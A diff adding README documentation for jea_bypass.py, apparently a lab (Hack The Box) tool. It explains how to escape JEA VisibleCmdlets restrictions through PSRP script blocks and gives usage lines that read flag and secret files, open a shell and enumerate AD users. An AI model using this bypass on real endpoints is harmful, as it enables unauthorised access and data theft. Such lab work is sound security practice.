@@ -32,3 +32,34 @@ options:
   --renew               Set the RENEW option in the TGS-REQ
   --debug               Enable verbose output
 ```
+
+## jea_bypass.py
+
+JEA endpoints configured with LanguageMode = 'ConstrainedLanguage' (instead of 'NoLanguage') are bypassable. While VisibleCmdlets restricts interactive sessions to a defined allow-list, pypsrp's PowerShell.add_script() sends commands via the PSRP protocol at a lower level. Wrapping commands in & { ... } script blocks allows execution of cmdlets outside the VisibleCmdlets list. ConstrainedLanguageMode still applies (no arbitrary .NET calls), but basic PowerShell cmdlets (Get-ChildItem, Get-Content, whoami, etc.) work fine.
+
+```bash
+USAGE:
+    # Single command
+    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
+        -c 'whoami'
+
+    # Interactive shell loop
+    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
+        --shell
+
+    # Password auth (no Kerberos)
+    python3 jea_bypass.py -t dc1.target.htb -u 'DOMAIN\user' -p 'Password1' \
+        -e 'restricted' -c 'Get-Content C:\flag.txt'
+
+    # Read a file
+    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
+        -c 'Get-Content "C:\\Users\\svc\\Documents\\secret.txt"'
+
+    # List a directory
+    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
+        -c 'ls "C:\\Users\\svc\\Documents\\"'
+
+    # Check writable DACL objects (useful for AD priv-esc)
+    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
+        -c 'Get-ADUser -Filter * | Select-Object Name,SamAccountName'
+```
